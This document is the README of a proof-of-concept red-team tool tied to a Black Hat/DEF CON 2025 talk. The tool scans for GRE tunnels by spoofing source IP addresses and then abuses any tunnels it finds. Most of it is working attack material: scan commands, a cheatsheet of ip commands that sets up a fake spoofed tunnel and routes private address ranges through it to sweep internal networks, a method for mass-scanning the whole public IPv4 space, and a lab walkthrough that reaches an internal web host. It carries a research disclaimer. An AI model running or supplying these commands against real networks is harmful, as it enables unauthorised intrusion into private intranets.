# GRE tunnel Scanner
## ⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️
### ⚠️This tool includes spoofing source IP addresses. Please ensure you have legal authorization to use it.⚠️
## Reference
- This is a PoC code for Talks: From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion
    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)
    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)
    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)
## Prepare
- `pip3 install requirement.txt`
## Usage
```
python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>
```
## Example
- for example `1.1.1.1` and `2.2.2.2` have a GRE tunnel to `3.3.3.3`
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1
```
- And get how to abuse GRE tunnel
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280

## route possible private ip ##
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16

### cleanup ###
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```

- if you know the endpoint but don't know the peer address you can do somethin like this
  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`
  - you well get reply from 8.8.8.8 while you get the right peer

- default setting about 500 package/sec.
## options
- `-sch`: Show Cheatsheet and exit (Input -i -lh -s -d which you found then get abuse GRE tunnel command)
- `-l3`: Layer 3 tunnel interface (Default: False)
- `-r`: Place GRE dest IP information in ICMP (Default: Place GRE src IP information)
- `-ss`: Save and use status file (the last scan will resume) (Default: False)
  - Recommend "on" in mass scan system sometime kill the script
- `-i <interface>`: Interface to send packet
- `-s <ip_or_file>`: An IP subnet or a list of IPs(subnets) to use as GRE src
- `-d <ip_or_file>`: An IP subnet or a list of IPs(subnets) to use as GRE dst
- `-L <file>`: scan a list of GRE peers
  - file every line look like this `1.1.1.1,2.2.2.2`
- `-lh <ip>`: An IP on your public interface (the IP on -i interface)
- `-o <file>`: Log file path
- `-t <float>`: Wait how many seconds after GRE packet send (Default: 2)
- `-T <int>`: How many threads send GRE packet at the same time (Default: 255)
- `-cs <int>`: Send how many IP until start wait for ping to respond (default: 1000)
- `-dp`: Do private - scan private IP GRE (Default: False)
- `-id <ip>`: Inside ICMP dst address (Default: same as GRE dst) 
  - Use this if you know the inside intranet address
- `-v <log_level>`: Logging level `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Default: INFO)
  - GRE peer found log is on `CRITICAL`


## better way to scan full public ip
```
wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss
```

## Lab
### Demo video
- [Youtube](https://youtu.be/DDvfYl5-J28)
### Scan GRE tunnel
`python3 main.py -i <iface> -lh <your_ip> -s 1.1.1.1 -d 160.25.104.199`
### Access & Scan intranet
```
#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
### start scan intranet ###
fping -g 192.168.0.0/16

##### scan output #####
# 192.168.1.2 is alive

## test curl to web ##
curl 192.168.1.2
# YOU KNOW GRE!

#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```


## Disclaimer
This project is intended for educational and research purposes only. Any actions and/or activities related to this code are solely your responsibility. The authors and contributors are not responsible for any misuse or damage caused by this project. Please ensure that you have proper authorization before testing, using, or deploying any part of this code in any environment. Unauthorized use of this code may violate local, state, and federal laws.

## License
This project is licensed under the terms of the MIT license.


---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-10-11

---